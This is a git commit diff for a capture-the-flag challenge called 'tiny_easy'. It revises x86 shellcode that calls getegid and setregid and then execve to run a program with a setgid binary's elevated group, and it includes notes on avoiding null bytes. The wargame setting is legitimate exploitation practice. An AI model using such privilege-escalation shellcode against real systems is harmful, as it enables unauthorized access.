3ce1ecb8a9159f90708071d43a839c3bf8f1f17f
Sam Downey <downey@Sams-Air-7.verizon.net>
2025-06-09 22:41:34 -0400

    tiny_easy pwned; wasn't NOSUID issue, just wrong syscall (had setreuid, needed setregid); two working solutions now though

--- tiny_easy/sh.asm
+++ tiny_easy/sh.asm
@@ -6,35 +6,18 @@ global _start
 section .text
 
 _start:
-    mov ebp, esp        ; get some storage space for getresgid
-    add ebp, 0x24
-
-    push 0x32
+    push 0x32             ; getegid
     pop eax
-    ; getresgid() -- store ebp = rgid, ebp+0x4 = egid, ebp+0x8 = sgid
-    ; push 0x7f           ; need 0xab in eax to call getresgid
-    ; pop eax             ; but push 0xab results in null bytes
-    ; add eax, 0x2c       ; so, obnoxious workaround: put 0x7f in eax, then add 0x2c
-    ; lea ebx, 0xffaca7c4 ; store rgid
-    ; lea ecx, 0xffaca7c8 ; store egid
-    ; lea edx, 0xffaca7cc ; store sgid
     int 0x80
-    mov edi, eax        ; store result (0 for success)
-;     xor esi, esi        ; deliberate crash, for debug
-;     call [esi]
 
-    ; setreuid(sgid, sgid)
-;     mov ebx, [ebp+0x8]  ; arg0
-;     mov ecx, ebx        ; arg1
     mov ebx, eax
     mov ecx, eax
-    push 0x46
-    pop eax             ; syscall # for setreuid
+    push 0x47           ; setregid
+    pop eax             ; syscall # for setregid
     int 0x80
-    mov esi, eax        ; store result (0 for success)
     
     ; execve(argv[1], NULL, NULL) TODO might need give non-NULL args
-    push 0x0b           ; syscall # for execve
+    push 0x0b           ; execve TODO might need to give non-null args
     pop eax
     mov ebx, [esp+4]    ; execve arg0 (pointer to argv[1] aka strpayload)
     ; mov ecx, [esp+8]    ; execve arg1 (pointer to argv[2], null string)
